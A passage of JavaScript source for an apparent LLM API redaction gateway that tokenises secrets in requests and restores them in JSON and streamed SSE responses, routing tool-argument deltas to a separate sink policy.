    const PROVIDER_TYPES = new Set(["gitleaks", "secret", "email", "phone", "identity", "bank"]);
    // Providers outrank non-providers. Among providers the highest-priority one wins;
    // among non-providers the first (already sorted) wins. An earlier rule let ANY inner
    // provider take over, which is how a wider `gitleaks` span that absorbed a narrower
    // `entropy` hit relabelled itself as entropy.
    const providerCandidates = ranked.filter((x) => PROVIDER_TYPES.has(x.type));
    const primaryInner = providerCandidates.length
      ? providerCandidates[0]
      : (PROVIDER_TYPES.has(span.type) ? span : ranked[0]);
    const evidence = span.evidence ? span.evidence.slice() : [];
    for (const extra of ranked) {
      if (extra.type && extra.type !== span.type && !evidence.includes(extra.type)) evidence.push(extra.type);
    }
    // Structural hints travel with the absorbed hit too. A provider rule commonly
    // wins the bounds over the narrower binding span, and without this the object
    // level recogniser loses the path it needs (a `data.password` span attributed to
    // `gitleaks` carries no path unless the merge hands it over).
    const structural = ranked.find((x) => x.pathSegments) || (span.pathSegments ? span : null);
    const inheritedEncoding = ranked.find((x) => x.schemaEncoding)?.schemaEncoding || span.schemaEncoding;
    merged.push({
      ...span,
      evidence,
      // Only inner hits of a DIFFERENT type count as absorbed; an identical span
      // from another detector is a duplicate, not an absorption, and recording it
      // would make the metadata self-referential.
      absorbed: ranked.map((x) => x.type).filter((t) => t && t !== span.type),
      type: primaryInner.type || span.type,
      providerType: span.type,
      priority: Math.max(span.priority, primaryInner.priority ?? 0),
      ...(structural && structural.pathSegments
        ? {
            pathSegments: structural.pathSegments,
            pathConfidence: structural.pathConfidence,
            indent: structural.indent,
            key: structural.key,
            syntax: structural.syntax,
          }
        : {}),
      ...(inheritedEncoding ? { schemaEncoding: inheritedEncoding } : {}),
    });
    for (const x of inner) absorbed.add(x);
  }

  // A span that was absorbed as evidence must not also be emitted on its own: the
  // merged entry inherits its type and priority, so both would carry the same
  // priority and the narrow one could win the overlap race, restoring the very
  // bounds bug this merge exists to fix.
  const absorbedSpans = merged.filter((m) => (m.absorbed || []).length && m.providerType);
  const isCoveredByMerged = (span) => absorbedSpans.some((m) => m !== span
    && span.start >= m.start && span.end <= m.end
    && !(span.start === m.start && span.end === m.end));
  const emitted = merged.filter((m) => !isCoveredByMerged(m));

  const selected = [];
  for (const s of emitted) if (!selected.some((x) => overlaps(s, x))) selected.push(s);
  // A detector span inside a REFERENCE construct widens to the whole construct. The parser
  // reports `reference_value` as evidence and the binding candidate is filtered out (a
  // template is an indirection, not a secret), but the inner detectors still fire -- and a
  // span covering only the inside left the syntax around it half-open:
  //
  //   DB_PASSWORD={{Redact:<64 hex>}}  ->  DB_PASSWORD={{Redact:CRG_...
  //
  // The envelope is the mutation boundary. Detector attribution is preserved: the inner
  // detector decides the ACTION, the construct decides the BOX.
  const enveloped = selected.map((span) => {
    const env = enclosingReference(text, span.start, span.end);
    if (!env) return span;
    return {
      ...span,
      start: env.start,
      end: env.end,
      // The BOX changed, the VERDICT did not: classification still runs on the value the
      // detector actually identified. Without this, `commit: "{{ <sha> }}"` stopped being
      // recognised as a git sha because the widened text includes the braces and spaces,
      // so a devops profile that preserves shas silently started redacting this one.
      classifiedText: text.slice(span.start, span.end),
      referenceEnvelope: { opener: env.opener, start: env.start, end: env.end },
      evidence: [...new Set([...(span.evidence || []), "reference_envelope"])],
    };
  });

  // A detector boundary is not an entity boundary either: widen each span to the enclosing
  // infrastructure entity and MERGE AGAIN, because the widened span now contains the
  // detector span and possibly its neighbours. Without re-merging, the detector's narrower
  // span survives alongside it and a partial replacement can win -- which is how
  // `i-0a1b2c3d4e5f67890` came out as `i-CRG_...`.
  const widened = enveloped.map((span) => {
    const envelope = resolveInfraEnvelope(text, span);
    if (!envelope) return span;
    return {
      ...span,
      start: envelope.start,
      end: envelope.end,
      infraEnvelope: { infraType: envelope.infraType, certainty: envelope.certainty },
      evidence: [...new Set([...(span.evidence || []), ...envelope.evidence])],
    };
  });
  const remerged = [];
  for (const span of widened.slice().sort((a, b) => (b.end - b.start) - (a.end - a.start) || a.start - b.start)) {
    if (!remerged.some((x) => overlaps(span, x))) remerged.push(span);
  }
  const sorted2 = remerged.sort((a,b) => a.start-b.start);

  // Last step: an object-level recogniser may impose a representation on a span
  // (Kubernetes Secret.data must stay base64). It only annotates; the caller decides
  // how to publish the replacement.
  const finalSpans = applyObjectSchema(text, sorted2);
  return coverage ? coverage.attachTo(finalSpans) : finalSpans;
}

export class RedactionLimitError extends Error {}

/**
 * Coverage status of the region a span came from, if the caller collected coverage.
 * Recorded alongside the class as an INDEPENDENT dimension -- it is deliberately not
 * merged into a confidence score and never downgrades a deterministic detector.
 */
function coverageStatusForSpan(spans, span) {
  const attempts = spans.coverage?.attempts;
  if (!attempts) return null;
  const hit = attempts.find((a) => span.start >= a.regionStart && span.end <= a.regionEnd);
  return hit ? hit.status : null;
}

function randomTokenChars(n) {
  const bytes = new Uint8Array(n);
  crypto.getRandomValues(bytes);
  let out = "";
  for (const b of bytes) out += TOKEN_ALPHABET[b % TOKEN_ALPHABET.length];
  return out;
}

// One request id per RedactionContext, i.e. per request. Entity ids are a local
// allocation counter, NOT a function of the plaintext: deriving any token
// component from the secret would hand an attacker an offline oracle for
// low-entropy values (PINs, card numbers, short passwords).
export function createRequestId() { return randomTokenChars(TOKEN_REQUEST_ID_WIDTH); }

export class RedactionContext {
  constructor({ salt = RUNTIME_SALT, maxRedactions = DEFAULT_MAX_REDACTIONS, requestId = null, foreignRegistry = null, profile = null } = {}) {
    this.salt = salt;
    // Which infra types this deployment is willing to let through. Consulted by the
    // policy, never by the recogniser.
    this.profile = profile || DEFAULT_PROFILE;
    // Registered foreign namespaces participate in INPUT ownership too, not only in
    // the restore policy. Without this the registry only governed the return path,
    // while the forward path still re-tokenised a foreign token it should preserve.
    this.foreignRegistry = foreignRegistry;
    this.maxRedactions = maxRedactions;
    this.requestId = requestId || createRequestId();
    this.nextToken = 0;
    this.rawToToken = new Map();
    this.tokenToRaw = new Map();
    // Representation-constrained entities publish a surrogate instead of the bare
    // token; the ledger is what makes the round trip possible (see SurrogateLedger).
    this.ledger = new SurrogateLedger();
    // Request-level parser coverage rollup (observability only; never gates redaction).
    this.coverage = [];
    // E1 entity classification ledger. Populated at emit time; consumed read-only by
    // entityClassFor(), which is what the sink policy asks.
    this.entityLedger = new EntityLedger();
    // Per-span policy decisions, for telemetry. Records the action and WHY, which is what
    // makes a preserve auditable rather than invisible.
    this.spanActions = [];
    // Eligibility for protected spans: a token is protected only if this request
    // minted or registered it. Shape alone is
    // never sufficient, otherwise a CRG-looking label would smuggle a secret past
    // detection.
    // A token is protected iff this layer OWNS it or a registered foreign namespace
    // claims it. Shape alone is never sufficient.
    this.isProtectedToken = (value) => {
      if (this.tokenToRaw.has(value)) return true;
      if (!this.foreignRegistry) return false;
      // An EXACT registration IS the trust decision, so the shape check does not
      // apply to it (same rule as classifyOwnership). Prefix namespaces do require a
      // token-shaped match, so an over-broad matcher cannot declare arbitrary text
      // foreign.
      if (this.foreignRegistry.tokens.has(value)) return true;
      return this.foreignRegistry.namespaceOf(value) !== null && isRegisteredTokenLike(value);
    };
  }
  nextTokenId() {
    this.nextToken += 1;
    return this.nextToken.toString(36).toUpperCase().padStart(TOKEN_ENTITY_ID_WIDTH, "0");
  }
  async tokenFor(raw) {
    if (this.rawToToken.has(raw)) return this.rawToToken.get(raw);
    if (this.rawToToken.size >= this.maxRedactions) throw new RedactionLimitError(`Redaction limit exceeded (${this.maxRedactions})`);
    const token = `${TOKEN_PREFIX}${this.requestId}_${this.nextTokenId()}`;
    const collision = this.tokenToRaw.get(token);
    if (collision !== undefined && collision !== raw) throw new Error("Redaction token collision");
    this.rawToToken.set(raw, token); this.tokenToRaw.set(token, raw);
    return token;
  }
  /**
   * Publish an entity, optionally through a representation-constrained surrogate.
   * `match` is the token a caller already knows, or the raw plaintext.
   */
  /**
   * Record what an entity was classified as, at emit time, while the span still carries
   * its detector/evidence/context. Never re-derived later from the token.
   */
  recordEntity(token, spanMeta = {}, encodingKind = ENCODING_KIND.PLAIN) {
    // Attribute to the MOST SPECIFIC detector that participated, not to whatever type
    // the merge happened to leave on the span. A provider rule that fired inside a
    // wider binding is the real evidence, even when the span's own type says otherwise.
    const detector = detectorOfSpan(spanMeta);
    return this.entityLedger.record(token, {
      detector,
      // Ledger closure: the infrastructure classification is recorded on the entity, so
      // entityClassFor() answers INFRA for a resolved envelope rather than UNKNOWN. The
      // enveloping evidence is kept with it, so "why is this INFRA" is answerable.
      infraType: spanMeta.infraEnvelope?.infraType || spanMeta.infra?.infraType || null,
      infraCertainty: spanMeta.infraEnvelope?.certainty || spanMeta.infra?.certainty || null,
      ruleId: spanMeta.ruleId ?? null,
      evidence: spanMeta.evidence ?? [],
      // The classifier reads this to recognise a strong binding; omitting it here made
      // every `DB_PASSWORD=...` classify as UNKNOWN even though the span carried it.
      strength: spanMeta.strength ?? null,
      syntax: spanMeta.syntax ?? null,
      key: spanMeta.key ?? null,
      pathSegments: spanMeta.pathSegments ?? null,
      coverageStatus: spanMeta.coverageStatus ?? null,
      encodingKind,
    });
  }

  /** E1: the classifier does not change verdicts; it only answers what a token was. */
  entityClassFor(token) {
    const entry = this.entityLedger.get(token);
    if (!entry) return ENTITY_CLASS.UNKNOWN;
    // An envelope-resolved entity is INFRA by construction, even though its detector may
    // have been the entropy detector.
    if (entry.infraType) return ENTITY_CLASS.INFRA;
    return entry.entityClass ?? ENTITY_CLASS.UNKNOWN;
  }

  async emit(match, encodingKind = ENCODING_KIND.PLAIN) {
    // Ownership decides, never shape. An earlier revision returned any TOKEN_FULL_RE
    // match verbatim, which meant an arbitrary token-SHAPED literal passed straight
    // through: `DB_PASSWORD=CRG_AAAA_AAAA` is a plausible low-entropy password, and
    // treating it as "already a token" forwarded it in the clear. A string is only a
    // token if THIS request minted it.
    const token = (typeof match === "string" && this.tokenToRaw.has(match))
      ? match
      : await this.tokenFor(match);
    return this.ledger.mint(token, encodingKind);
  }

  async redactText(text, flags) {
    const coverage = new ParserCoverage();
    const spans = findSensitiveSpans(
      text,
      { ...flags, protectedTokenPatterns: this.protectedTokenPatterns },
      { isProtectedToken: this.isProtectedToken, foreignRegistry: this.foreignRegistry, coverage }
    );
    // Request-level rollup. Unioned across parsers, so two parsers looking at the same
    // text cannot double count.
    this.coverage.push(coverage.summary());
    if (!spans.length) return text;
    let out = "", at = 0;
    for (const s of spans) {
      out += text.slice(at, s.start);
      const raw = text.slice(s.start, s.end);
      const encodingKind = s.schemaEncoding || ENCODING_KIND.PLAIN;

      // Policy layer. The recogniser only classifies; THIS is where a classification can
      // turn into an action, which is what keeps the recogniser from preserving anything
      // on its own. Monotonic risk is enforced inside decideSpanAction: hard secret
      // evidence is never downgraded by an infra label.
      const detector = detectorOfSpan(s);
      // Context is what lets an anchored form be recognised: `commit <40-hex>` is a git
      // sha, while a bare 40-hex run is shape-ambiguous and must not be preserved.
      // Classification runs on the value the detector identified, which for a widened
      // envelope is the PRE-widening text: the envelope is a boundary, not a verdict.
      const classifyText = s.classifiedText || raw;
      const contextBefore = s.classifiedText
        ? text.slice(Math.max(0, s.start - 64), s.start)
        : text.slice(Math.max(0, s.start - 64), s.start);
      const infra = recogniseInfra(classifyText, contextBefore)
        || (s.infraEnvelope && classifyText === raw ? recogniseInfra(raw) : null);
      const decision = decideSpanAction({ detector, ruleId: s.ruleId, infra, profile: this.profile });
      this.spanActions.push({
        detector,
        ruleId: s.ruleId ?? null,
        infraType: infra?.infraType ?? null,
        certainty: infra?.certainty ?? null,
        action: decision.action,
        reason: decision.reason,
        bytes: raw.length,
      });

      if (decision.action === "preserve") {
        // Emitted verbatim: no token, nothing recorded in the mapping, and therefore
        // nothing for restoreText to substitute later.
        out += raw;
        at = s.end;
        continue;
      }

      const visible = await this.emit(raw, encodingKind);
      const token = resolveSurrogate(visible, this);
      // Recorded BEFORE any verdict could change, so telemetry and the enforcement path
      // see the same classification.
      this.recordEntity(
        token,
        { ...s, detector, coverageStatus: coverageStatusForSpan(spans, s), infra },
        encodingKind
      );
      void 0;
      out += visible;
      at = s.end;
    }
    return out + text.slice(at);
  }
  /** Rollup of the per-span policy decisions taken in this request. */
  policySummary() {
    const byAction = {};
    for (const row of this.spanActions) {
      const acc = byAction[row.action] || (byAction[row.action] = { spans: 0, bytes: 0, reasons: {} });
      acc.spans += 1;
      acc.bytes += row.bytes;
      acc.reasons[row.reason] = (acc.reasons[row.reason] || 0) + 1;
    }
    return { decisions: this.spanActions.length, byAction, rows: this.spanActions };
  }

  /** Rollup of every parser attempt seen in this request. */
  coverageSummary() {
    const all = this.coverage;
    const byParser = {};
    for (const entry of all) {
      for (const [parser, stats] of Object.entries(entry.byParser || {})) {
        const acc = byParser[parser] || (byParser[parser] = { attempted: 0, parsed: 0, partial: 0, failed: 0, bytes: 0 });
        acc.attempted += stats.attempted;
        acc.parsed += stats.parsed;
        acc.partial += stats.partial;
        acc.failed += stats.failed;
        acc.bytes += stats.bytes;
      }
    }
    const sum = (key) => all.reduce((n, e) => n + (e[key] || 0), 0);
    return {
      calls: all.length,
      attempted_regions: sum("attempted_regions"),
      parsed_regions: sum("parsed_regions"),
      partial_regions: sum("partial_regions"),
      failed_regions: sum("failed_regions"),
      attempted_bytes: sum("attempted_bytes"),
      located_bytes: sum("located_bytes"),
      unknown_bytes: sum("unknown_bytes"),
      byParser,
    };
  }

  restoreText(text) {
    // Both formats are restored during the transition. Mapping lookup is the only
    // authority: an unknown token of either shape is left untouched.
    //
    // Surrogates are handled FIRST and by exact visible-string match against the
    // ledger. Decoding arbitrary base64-looking text is deliberately not attempted:
    // only strings this request actually minted are eligible, which keeps unrelated
    // base64 payloads untouched.
    let out = text;
    if (this.ledger.size > 0) {
      for (const { visible, token } of this.ledger.entries()) {
        if (!out.includes(visible)) continue;
        const raw = this.tokenToRaw.get(token);
        if (raw === undefined) continue;
        out = out.split(visible).join(raw);
      }
    }
    return out
      .replace(TOKEN_RE, (token) => this.tokenToRaw.get(token) ?? token)

  }
}

const CONTROL_KEYS = new Set(["model","role","type","id","object","status","name","call_id","tool_call_id","finish_reason","stop_reason","media_type","mime_type","encoding","format"]);
function shouldSkipString(path) {
  const key = path[path.length - 1] || "";
  if (CONTROL_KEYS.has(key)) return true;
  const p = path.join(".").toLowerCase();
  // Binary/payload fields stay skipped: base64 image and audio bodies are not text and
  // must not be rewritten.
  if (/(?:input_image|input_audio|audio|file_data|b64_json|source\.data|image\.data)/.test(p)) return true;
  // `image_url` is an image payload carrier, not a link a user pasted, so it stays
  // skipped. A plain `url` field is NOT skipped any more: skipping it meant
  // `{"url": "https://x/?access_token=SECRET"}` was forwarded verbatim, because the
  // string never reached redactText at all. The URL query parser now produces a raw
  // span for the sensitive value, so the field is scanned like any other string.
  if (key === "image_url") return true;
  return false;
}

export async function redactJson(value, ctx, flags, path = []) {
  if (typeof value === "string") return shouldSkipString(path) ? value : ctx.redactText(value, flags);
  if (Array.isArray(value)) {
    const out = [];
    for (let i=0;i<value.length;i++) out.push(await redactJson(value[i], ctx, flags, path.concat(String(i))));
    return out;
  }
  if (value && typeof value === "object") {
    const out = {};
    for (const [k,v] of Object.entries(value)) out[k] = await redactJson(v, ctx, flags, path.concat(k));
    return out;
  }
  return value;
}

export function restoreJson(value, ctx) {
  if (typeof value === "string") return ctx.restoreText(value);
  if (Array.isArray(value)) return value.map((v) => restoreJson(v, ctx));
  if (value && typeof value === "object") { for (const k of Object.keys(value)) value[k] = restoreJson(value[k], ctx); }
  return value;
}

export function detectProtocol(body, upstream, headers) {
  const p = upstream.pathname.toLowerCase();
  if (/\/chat\/completions\/?$/.test(p)) return "openai_chat";
  if (/\/responses\/?$/.test(p)) return "openai_responses";
  if (/\/messages\/?$/.test(p)) return "anthropic_messages";
  if (body && Array.isArray(body.messages)) return headers?.get?.("anthropic-version") ? "anthropic_messages" : "openai_chat";
  if (body && (typeof body.input === "string" || Array.isArray(body.input))) return "openai_responses";
  return "generic";
}

function prependToContent(message, protocol) {
  const prefix = REDACT_NOTICE + "\n\n";
  if (typeof message.content === "string") { message.content = prefix + message.content; return true; }
  if (Array.isArray(message.content)) {
    for (const block of message.content) {
      if (block && typeof block === "object" && typeof block.text === "string" && (block.type === "text" || block.type === "input_text" || !block.type)) { block.text = prefix + block.text; return true; }
    }
    message.content.unshift({ type: protocol === "openai_responses" ? "input_text" : "text", text: REDACT_NOTICE });
    return true;
  }
  message.content = prefix;
  return true;
}

export function injectRedactNotice(body, protocol) {
  if (!body || typeof body !== "object") return false;
  if (protocol === "openai_responses") {
    if (typeof body.input === "string") { body.input = REDACT_NOTICE + "\n\n" + body.input; return true; }
    if (Array.isArray(body.input)) {
      for (let i = body.input.length - 1; i >= 0; i--) {
        const item = body.input[i];
        if (item && item.role === "user") return prependToContent(item, protocol);
      }
      return false;
    }
  }
  if (Array.isArray(body.messages)) {
    for (let i = body.messages.length - 1; i >= 0; i--) {
      const m = body.messages[i];
      if (m && m.role === "user") return prependToContent(m, protocol);
    }
  }
  return false;
}

function filteredRequestHeaders(headers) {
  const out = new Headers(headers);
  const exact = new Set([
    "host","content-length","connection","transfer-encoding","keep-alive",
    "proxy-authenticate","proxy-authorization","te","trailer","upgrade","accept-encoding",
    "x-forwarded-for","x-forwarded-proto","x-real-ip","forwarded","via",
    "cookie","cookie2"
  ]);
  for (const [name] of [...out]) {
    const k = name.toLowerCase();
    if (exact.has(k) || k.startsWith("cf-") || k.startsWith("sec-")) out.delete(name);
  }
  return out;
}

function withCors(headers, origin = "*") {
  const h = new Headers(headers);
  h.set("access-control-allow-origin", origin || "*");
  h.set("access-control-expose-headers", "*");
  h.delete("content-length");
  return h;
}

function corsPreflight(request, origin = "*") {
  const h = new Headers();
  h.set("access-control-allow-origin", origin || "*");
  h.set("access-control-allow-methods", "GET,HEAD,POST,PUT,PATCH,DELETE,OPTIONS");
  h.set("access-control-allow-headers", request.headers.get("access-control-request-headers") || "authorization,content-type,x-api-key,anthropic-version,openai-organization,openai-project");
  h.set("access-control-max-age", "86400");
  return new Response(null, { status:204, headers:h });
}

function intSetting(v, fallback) { const n = Number(v); return Number.isFinite(n) && n > 0 ? Math.floor(n) : fallback; }
function allowedHost(upstream, env) {
  const raw = env?.REDACT_ALLOWED_HOSTS;
  if (!raw) return true;
  const allow = raw.split(",").map((x)=>x.trim().toLowerCase()).filter(Boolean);
  return allow.some((h) => upstream.hostname.toLowerCase() === h || upstream.hostname.toLowerCase().endsWith("." + h));
}
function jsonError(status, message) { return new Response(JSON.stringify({ error: { message, type:"cosy_redact_gateway_error" } }), { status, headers:{"content-type":"application/json; charset=utf-8"} }); }

function isJsonContentType(ct) { return /(^|[+\/])json(?:$|[; ])/i.test(ct || "") || /application\/.*\+json/i.test(ct || ""); }
function isTextualContentType(ct) { return isJsonContentType(ct) || /^text\//i.test(ct || "") || /javascript|xml/i.test(ct || ""); }

// Returns the length of a trailing fragment that could still become a protected
// token, so the stream layer holds it back instead of emitting it. Handles both
// the v2 prefix.
/**
 * The holdback contracts a stream obeys, from the AUTHORITIES that can vouch for them:
 *
 *   - this layer's own dialect (CRG) -- one exact literal of known length;
 *   - the surrogate LEDGER -- exact literals; a string that merely *looks* base64 is not
 *     held back, because "looks like" is not ownership;
 *   - the foreign REGISTRY -- exact registrations (literals) and namespace `streamPrefix`
 *     anchors, which are open-ended and therefore need a declared end condition.
 *
 * The two kinds behave differently and must not be conflated:
 *
 *   literal    proper prefix -> HOLD; complete literal -> RELEASE; anything after it is
 *              ordinary text and must not extend the hold.
 *   namespace  open-ended while the body characters are inside the declared continuation
 *              set and the declared maximum length has not been reached.
 */
export function streamHoldbackPrefixes(ctx, registry = null, sinks = null) {
  const entries = [{ kind: "literal", value: TOKEN_PREFIX }];
  if (ctx && ctx.ledger) {
    // Exact visible surrogates: ledger-driven, never shape-driven. Whether a surrogate is
    // usable in this channel does not change whether it must be held back -- a split token
    // is broken regardless of the policy applied to it later.
    for (const entry of ctx.ledger.entries()) entries.push({ kind: "literal", value: entry.visible });
  }
  if (registry) {
    for (const token of registry.tokens) entries.push({ kind: "literal", value: token });
    for (const ns of registry.namespaces) {
      if (!ns.streamPrefix) continue;
      entries.push({
        kind: "namespace",
        value: ns.streamPrefix,
        continuation: ns.streamContinuation || null,
        maxLength: ns.streamMaxLength || null,
      });
    }
  }
  void sinks;
  return entries;
}

/** Accepts bare strings (exact literals) or descriptors. */
function normalizeHoldbacks(holdbacks) {
  return (holdbacks || [])
    .map((entry) => (typeof entry === "string" ? { kind: "literal", value: entry } : entry))
    .filter((entry) => entry && entry.value);
}

/** An EXACT literal: hold a proper prefix, release the moment the literal is complete. */
function heldForLiteral(text, literal) {
  if (!literal || literal.length < 2) return 0;
  const max = Math.min(literal.length, text.length);
  for (let k = max; k > 0; k--) {
    if (!text.endsWith(literal.slice(0, k))) continue;
    // k === literal.length means the literal itself ends the buffer: it is COMPLETE, so the
    // policy can already run. Holding it would stall the channel until finish() even though
    // nothing more is expected. Only a proper prefix is ambiguous.
    return k === literal.length ? 0 : k;
  }
  return 0;
}

/**
 * A namespace anchor is open-ended, so it is held only while the token can still grow: its
 * body characters stay inside the declared continuation set and the declared maximum length
 * has not been reached.
 */
function heldForNamespace(text, entry) {
  const prefix = entry.value;
  if (!prefix || prefix.length < 2) return 0;
  const anchorAt = text.lastIndexOf(prefix);
  if (anchorAt < 0) {
    const max = Math.min(prefix.length - 1, text.length);
    for (let k = max; k > 0; k--) if (text.endsWith(prefix.slice(0, k))) return k;
    return 0;
  }
  const body = text.slice(anchorAt + prefix.length);
  // The declared bound is what stops `ACME_` + 10 MB of body from buffering the whole
  // stream: past it, the token is handed to the matcher and released.
  if (entry.maxLength && body.length >= entry.maxLength) return 0;
  if (!entry.continuation) return text.length - anchorAt;
  for (const ch of body) if (!entry.continuation.test(ch)) return 0; // the token ended
  return text.length - anchorAt;
}

/**
 * Length of a trailing fragment that could still grow into a protected string. Exact, not
 * heuristic: every contract is declared rather than derived from a regex.
 */
export function partialPrefixLength(text, holdbacks) {
  let longest = 0;
  for (const entry of normalizeHoldbacks(holdbacks)) {
    const held = entry.kind === "namespace" ? heldForNamespace(text, entry) : heldForLiteral(text, entry.value);
    if (held > longest) longest = held;
  }
  return longest;
}

/**
 * The prefixes a stream must hold back, from the AUTHORITIES that can vouch for them:
 *
 *   - this layer's own dialect (CRG), always;
 *   - the surrogate LEDGER, which is the only source of surrogate eligibility -- a string
 *     that merely *looks* base64 is not held back, because "looks like" is not ownership;
 *   - the foreign REGISTRY, via exact registrations and the explicit `streamPrefix` of a
 *     namespace. Deriving a prefix from an arbitrary regex is not reliable, and a partial
 *     matcher is not worth writing.
 */

/**
 * True when the text ends with a COMPLETE registered token (or one matching a namespace
 * matcher), meaning the ambiguous tail has resolved and can be released.
 */
function endsWithCompleteRegistration(text, registry) {
  if (!registry) return null;
  let best = null;
  for (const token of registry.tokens) {
    if (token && text.endsWith(token) && (!best || token.length > best.length)) best = token;
  }
  for (const ns of registry.namespaces) {
    ns.matcher.lastIndex = 0;
    for (const f of text.match(ns.matcher) || []) {
      if (f && text.endsWith(f) && (!best || f.length > best.length)) best = f;
    }
  }
  return best;
}

function possibleTokenSuffixLength(s) {
  // One dialect, one shape: `CRG_` plus the two identifier segments. A tail that could still
  // grow into one is held back.
  const prefix = TOKEN_PREFIX;
  const start = s.lastIndexOf(prefix);
  if (start >= 0) {
    const tail = s.slice(start);
    const body = /^[A-Z0-9_]{0,11}$/;
    if (tail.length < TOKEN_LENGTH && (tail.length <= prefix.length || body.test(tail.slice(prefix.length)))) {
      return s.length - start;
    }
  }
  const max = Math.min(prefix.length - 1, s.length);
  for (let k = max; k > 0; k--) if (s.endsWith(prefix.slice(0, k))) return k;
  return 0;
}

function parseSseEvent(raw) {
  const lines = raw.split("\n");
  const data = [], nonData = [];
  let insertAt = -1, eventName = "";
  for (const line of lines) {
    if (line.startsWith("data:")) { if (insertAt < 0) insertAt = nonData.length; data.push(line.slice(5).replace(/^ /,"")); }
    else { if (line.startsWith("event:")) eventName = line.slice(6).trim(); nonData.push(line); }
  }
  return { raw, lines, dataText:data.join("\n"), nonData, insertAt, eventName };
}

function serializeSseEvent(parsed, dataText) {
  if (parsed.insertAt < 0) return parsed.raw + "\n\n";
  const lines = parsed.nonData.slice();
  lines.splice(parsed.insertAt, 0, "data: " + dataText);
  return lines.join("\n") + "\n\n";
}

function getAt(obj, path) { let x=obj; for (let i=0;i<path.length-1;i++) x=x?.[path[i]]; return x; }
function collectStringLeaves(value, basePath, channelPrefix, fields, local = []) {
  if (!value || typeof value !== "object") return;
  for (const [key, child] of Object.entries(value)) {
    const next = local.concat(key);
    if (typeof child === "string") {
      // Metadata fields are not streamed user/model text and must not be coalesced.
      if (["role","type","id","object","status","finish_reason","stop_reason"].includes(key)) continue;
      fields.push({ path:basePath.concat(next), channel:`${channelPrefix}:${next.join(".")}` });
    } else if (child && typeof child === "object") {
      collectStringLeaves(child, basePath, channelPrefix, fields, next);
    }
  }
}

// Each streaming field is tagged with the SINK it belongs to, because the same delta
// envelope carries both prose and tool operands. Without the tag the stream layer would
// resolve tokens in a tool argument exactly like it does in prose.
function sinkForChatDeltaPath(path) {
  return path.includes("tool_calls")
    ? { kind: SINK_KIND.TOOL_ARGUMENT }
    : { kind: SINK_KIND.ASSISTANT_TEXT };
}

// Responses API: the EVENT TYPE says what the payload is. A field literally named `delta`
// carries prose for `.output_text.delta` and a shell command for
// `.function_call_arguments.delta`, so routing by field name resolved a tool operand like
// prose. Unknown events default to the conservative sink.
const RESPONSES_EVENT_SINK = Object.freeze({
  "response.output_text.delta": { kind: "assistant_text" },
  "response.refusal.delta": { kind: "assistant_text" },
  "response.reasoning_text.delta": { kind: "assistant_text" },
  "response.reasoning_summary_text.delta": { kind: "assistant_text" },
  "response.function_call_arguments.delta": { kind: "tool_argument", field: "delta" },
  "response.function_call_arguments.done": { kind: "tool_argument", field: "arguments" },
  "response.mcp_call_arguments.delta": { kind: "tool_argument", field: "delta" },
  "response.mcp_call_arguments.done": { kind: "tool_argument", field: "arguments" },
  "response.custom_tool_call_input.delta": { kind: "tool_argument", field: "delta" },
  "response.custom_tool_call_input.done": { kind: "tool_argument", field: "input" },
});

function responsesSink(type) {
  const entry = RESPONSES_EVENT_SINK[type];
  return entry ? { kind: entry.kind } : { kind: "tool_argument" };
}

function responsesOperandField(type) {
  return RESPONSES_EVENT_SINK[type]?.field || null;
}

function streamFields(data, eventName="") {
  const fields=[];
  if (Array.isArray(data?.choices)) {
    data.choices.forEach((choice, ci) => {
      if (choice?.delta && typeof choice.delta === "object") {
        const before = fields.length;
        collectStringLeaves(choice.delta,["choices",ci,"delta"],`chat:${choice.index ?? ci}:delta`,fields);
        for (let i = before; i < fields.length; i++) fields[i].sink = sinkForChatDeltaPath(fields[i].path);
        // A tool-call argument delta is identified by its path, not its channel, so the
        // tool name is only available on the first fragment.
        const toolName = choice.delta?.tool_calls?.[0]?.function?.name;
        if (toolName) for (let i = before; i < fields.length; i++) fields[i].sink.toolName = toolName;
      }
      // Some compatible providers use a legacy text delta.
      if (typeof choice?.text === "string") fields.push({ path:["choices",ci,"text"], channel:`chat:${choice.index ?? ci}:text`, sink:{ kind: SINK_KIND.ASSISTANT_TEXT } });
    });
  }
  const typ = data?.type || eventName || "event";

  // Anthropic: `input_json_delta` is a tool operand, `text_delta` is prose.
  const anthropicTool = typ === "input_json_delta" || typ === "content_block_delta" && data?.delta?.type === "input_json_delta";

  // Responses: the EVENT TYPE decides, never the field name.
  const isResponsesEvent = typeof typ === "string" && typ.startsWith("response.");
  if (isResponsesEvent) {
    const sink = responsesSink(typ);
    const operandField = responsesOperandField(typ);
    const channel = `responses:${typ}:${data.output_index ?? ""}:${data.content_index ?? ""}:${data.item_id ?? ""}`;
    if (operandField) {
      // `.done` events carry the finished operand under a version-specific name.
      if (typeof data[operandField] === "string") {
        fields.push({ path: [operandField], channel, sink });
      } else {
        const before = fields.length;
        collectStringLeaves(data, ["."], channel, fields);
        for (let i = before; i < fields.length; i++) fields[i].sink = sink;
      }
      return fields;
    }
    if (typeof data.delta === "string") {
      fields.push({ path: ["delta"], channel, sink });
    } else if (data.delta && typeof data.delta === "object") {
      const before = fields.length;
      collectStringLeaves(data.delta, ["delta"], channel, fields);
      for (let i = before; i < fields.length; i++) fields[i].sink = sink;
    }
    return fields;
  }

  const sink = anthropicTool
    ? { kind: SINK_KIND.TOOL_ARGUMENT }
    : { kind: SINK_KIND.ASSISTANT_TEXT };
  if (typeof data?.delta === "string" && /delta/i.test(typ)) {
    fields.push({ path:["delta"], channel:`delta:${typ}:${data.index ?? ""}`, sink });
  } else if (data?.delta && typeof data.delta === "object") {
    const before = fields.length;
    collectStringLeaves(data.delta,["delta"],`delta:${typ}:${data.index ?? ""}`,fields);
    for (let i = before; i < fields.length; i++) fields[i].sink = sink;
  }
  return fields;
}

function restoreCompleteStrings(value, ctx, excluded = new Set(), path = [], trusted = null, registry = null) {
  // Non-delta strings are prose by default. They are NOT resolved blindly: a protocol
  // adapter that resolved everything is what let tool operands through.
  if (typeof value === "string") {
    if (excluded.has(path.join("."))) return value;
    return applySinkPolicy(value, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
  }
  if (Array.isArray(value)) { for (let i=0;i<value.length;i++) value[i]=restoreCompleteStrings(value[i],ctx,excluded,path.concat(String(i))); return value; }
  if (value && typeof value === "object") { for (const k of Object.keys(value)) value[k]=restoreCompleteStrings(value[k],ctx,excluded,path.concat(k)); }
  return value;
}

class SseRestorer {
  constructor(ctx, trusted = null, registry = null) {
    this.ctx=ctx; this.trusted=trusted; this.registry=registry; this.channels=new Map(); this.queue=[];
    // Built once per stream from the ledger and the registry.
